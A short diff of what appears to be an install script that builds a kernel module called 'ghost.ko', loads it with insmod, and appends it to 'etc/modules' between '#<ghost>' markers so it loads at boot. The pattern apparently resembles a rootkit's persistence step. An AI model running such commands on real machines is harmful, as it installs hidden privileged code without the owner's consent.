@@ -10,7 +10,7 @@ bash monitor.sh
 cd ghost
 make all
 insmod ghost.ko
-echo -e "#<ghost>\nghost\n#<ghost>" >> etc/modules
+echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
 cd ..
 # insmod ghost.ko
 # echo -e "#<ghost>\nghost\n#<ghost>" >> etc/modules
